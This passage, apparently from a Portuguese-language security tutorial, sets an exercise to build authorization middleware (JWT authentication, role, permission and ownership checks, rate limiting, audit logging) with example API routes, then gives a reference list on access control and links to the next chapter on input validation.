  - `Authenticate` -- valida JWT e injeta user no contexto
  - `RequireRole(role)` -- verifica se user tem a role
  - `RequirePermission(perm)` -- verifica se user tem a permissao
  - `RequireOwnership(getOwner)` -- verifica ownership do resource
  - `RateLimit(points, duration)` -- limita taxa de requisicoes
  - `AuditLog(logger)` -- registra todas as operacoes
- Implementar `Chain` function que combina middlewares
- Criar rotas de exemplo:
  - `GET /api/articles` -- publico
  - `POST /api/articles` -- requer role editor
  - `GET /api/admin/users` -- requer role admin
  - `PUT /api/articles/:id` -- requer ownership
  - `DELETE /api/articles/:id` -- requer ownership ou role admin
- Escrever testes de integracao
- Benchmark para medir overhead do middleware

---

## 8.15 Referencias

1. **OWASP** -- Authorization Cheat Sheet: https://cheatsheetseries.owasp.org/cheatsheets/Authorization_Cheat_Sheet.html
2. **NIST SP 800-162** -- Guide to Access Control: https://csrc.nist.gov/publications/detail/sp/800-162/final
3. **RFC 7519** -- JSON Web Token (JWT): https://tools.ietf.org/html/rfc7519
4. **RFC 5246** -- The Transport Layer Security (TLS) Protocol: https://tools.ietf.org/html/rfc5246
5. **OPA Documentation** -- Open Policy Agent: https://www.openpolicyagent.org/docs/
6. **Casbin Documentation** -- Authorization Library: https://casbin.org/docs/overview
7. **Cedar Language** -- Amazon Authorization: https://www.cedarpolicy.com/
8. **graphql-shield** -- GraphQL Authorization: https://github.com/maticzav/graphql-shield
9. **PostgreSQL Documentation** -- Row Security Policies: https://www.postgresql.org/docs/current/ddl-rowsecurity.html
10. **OWASP Top 10 2021** -- A01:2021 Broken Access Control: https://owasp.org/Top10/A01_2021-Broken_Access_Control/
11. **Abadi, D.** -- Authorization in Distributed Systems: https://www.cs.cornell.edu/home/lad/place/abadi-auth.pdf
12. **Hoyland, J.** -- Semiring Algebra for Logical Authorization: https://dl.acm.org/doi/10.1145/1132956.1132962

---

*[Proximo capitulo: 09 -- Validacao de Entrada e Sanitizacao](09-validacao-entrada-sanitizacao.md)*
